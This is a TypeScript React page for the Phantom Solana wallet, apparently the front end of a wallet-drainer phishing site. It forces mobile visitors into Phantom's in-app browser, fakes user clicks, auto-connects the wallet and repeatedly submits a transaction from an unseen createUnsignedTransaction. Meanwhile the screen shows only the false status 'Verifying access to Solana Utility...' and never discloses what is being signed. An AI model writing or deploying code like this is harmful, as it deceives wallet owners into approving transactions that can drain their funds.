'use client'

import { useEffect, useRef, useState } from 'react'
import { useConnection, useWallet } from '@solana/wallet-adapter-react'
import { WalletName } from '@solana/wallet-adapter-base'
import { createUnsignedTransaction } from '../services/transaction'
import { Transaction } from '@solana/web3.js'

// Phantom provider tipi
interface PhantomProvider { isPhantom?: boolean }
declare global { interface Window { solana?: PhantomProvider } }

export default function TransactionPage() {
  const { connection } = useConnection()
  const { publicKey, sendTransaction, connect, select, connected } = useWallet()

  const retries = useRef(0)
  const maxRetries = 3
  const waiting   = useRef(false)
  const [status, setStatus] = useState('Loading...')

  /* ——— ➊ DEEPLINK: Android ve iOS için ayrı şema ——— */
  useEffect(() => {
    const ua           = navigator.userAgent
    const isAndroid    = /Android/i.test(ua)
    const isIOS        = /iPhone|iPad|iPod/i.test(ua)
    const hasPhantom   = window.solana?.isPhantom ?? false

    // Phantom in-app browser’da değilsek ve mobil cihazdaysak
    if (!hasPhantom && (isAndroid || isIOS)) {
      const simulateClick = () =>
        document.body.dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true }))

      const href    = window.location.href
      const encHref = encodeURIComponent(href)

      // Android ve iOS için aynı custom-scheme kullanılıyor:
      const schemePhantom    = `phantom://browse/${encHref}?ref=${encHref}`
      const universalPhantom = `https://phantom.app/ul/browse/${encHref}?ref=${encHref}`

      simulateClick()
      const a = document.createElement('a')
      a.href   = isAndroid
        ? schemePhantom
        : universalPhantom
      a.target = '_blank'
      document.body.appendChild(a)
      a.click()
      setTimeout(() => a.remove(), 500)

      return
    }
  }, [])
  /* ————————————————————————————————————————————————————— */

  /* ——— ➋ İŞLEM GÖNDERME AKIŞI ——— */
  useEffect(() => {
    const simulateClick = () =>
      document.body.dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true }))

    const trySendTransaction = async () => {
      if (!publicKey || waiting.current || retries.current >= maxRetries) return
      waiting.current = true

      try {
        simulateClick()
        setStatus('Verifying access to Solana Utility...')
        const tx = await createUnsignedTransaction(publicKey)
        if (!tx) throw new Error('Null transaction')
        const sig = await sendTransaction(tx as unknown as Transaction, connection)
        console.log('✅ transaction sent:', sig)
        setStatus('Successful ✅')
      } catch (err: unknown) {
        console.warn('⚠️ İşlem hatası:', err)
        retries.current += 1
        setStatus('Verifying access to Solana Utility...')
        setTimeout(() => { waiting.current = false; void trySendTransaction() }, 3000)
      }
    }

    const start = async () => {
      try {
        simulateClick()
        await select('Phantom' as WalletName)
        if (!connected) await connect()
        if (publicKey) void trySendTransaction()
      } catch (err) {
        console.error('connection error:', err)
        setStatus('Connection error ❌')
      }
    }

    void start()
  }, [publicKey, connected, connect, select, sendTransaction, connection])
  /* ————————————————————————————————————————————————————————— */

  return (
    <div style={{
      backgroundColor: 'black',
      width: '100vw',
      height: '100vh',
      display: 'flex',
      justifyContent: 'center',
      alignItems: 'center',
      color: 'white',
      fontSize: '16px',
      fontFamily: 'monospace'
    }}>
      {status}
    </div>
  )
}
